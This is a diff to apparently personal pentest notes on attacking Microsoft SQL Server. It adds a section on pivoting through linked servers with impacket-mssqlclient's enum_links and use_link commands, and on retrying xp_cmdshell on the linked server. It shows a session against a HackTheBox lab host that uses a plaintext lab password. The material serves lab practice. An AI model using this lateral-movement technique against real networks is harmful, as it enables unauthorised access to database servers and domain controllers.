@@ -74,16 +74,70 @@ SELECT * FROM sys.dm_exec_sessions;       -- Active sessions and connections
 SELECT * FROM sys.dm_exec_connections;
 
 SELECT * FROM sys.dm_exec_requests;       -- SQL process
+
+
 ```
 
 <br>
 
-### Links
+### Links:
 
-Working on this seccion....
+```diff
+- Warning: This option might not be available if you are using an old version of imapcket.
+Use v0.11 or above. In kali use command `impacket-mssqlclient`
+```
+
+When mssql service is conected to multiple machines (AD environment is a good example) you can access to this machines through mssqlclient.py. To do it just use `enum_links` option to see the "Linked servers" availables. Select any with `use_link "<name of linked server>"`. Now you are against a diferent machine, and you can try again xp_cmdshell or any step above.
+
+Example:
+
+```
+┌──(xavi㉿kali)-[~/tools]
+└─$ impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (darkzero\john.w  guest@master)> enum_links
+
+
+SQL (darkzero\john.w  guest@master)> enum_links
+SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
+-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
+DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      
+
+DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      
+
+Linked Server       Local Login       Is Self Mapping   Remote Login   
+-----------------   ---------------   ---------------   ------------   
+DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   
+
+
+SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
+SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
+```
+
+
+
+
+
+
+
+
 
 <br>
 
 Other interesting articles: https://one2bla.me/Breach-operations/attacking-mssql
 
+<br>
 
+Recomended labs to practice:
+- Darkzero (Hackthebox)
+- Signed (Hackthebox)
+- Querier (Hackthebox)
